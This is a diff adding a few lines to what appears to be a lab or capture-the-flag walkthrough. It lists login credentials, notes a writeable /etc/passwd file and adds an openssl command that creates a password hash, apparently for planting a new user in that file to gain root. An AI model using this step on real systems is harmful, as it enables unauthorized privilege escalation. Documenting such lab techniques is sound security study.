@@ -130,3 +130,10 @@ Credentials: falaraki:Transclisiation
   - Writeable `/etc/passwd` file.
 ![image](https://user-images.githubusercontent.com/83878909/234844540-b33dfab0-c742-414c-8e67-e470a551fd84.png)
 
+  - Generate Password
+```CSS
+▶ openssl passwd -1 -salt random passwd123
+$1$random$UuecLMKsRjAA/tqoL9SKL.
+```
+![image](https://user-images.githubusercontent.com/83878909/234854606-78438923-1830-4c04-9d3f-56fad5e1c9f8.png)
+
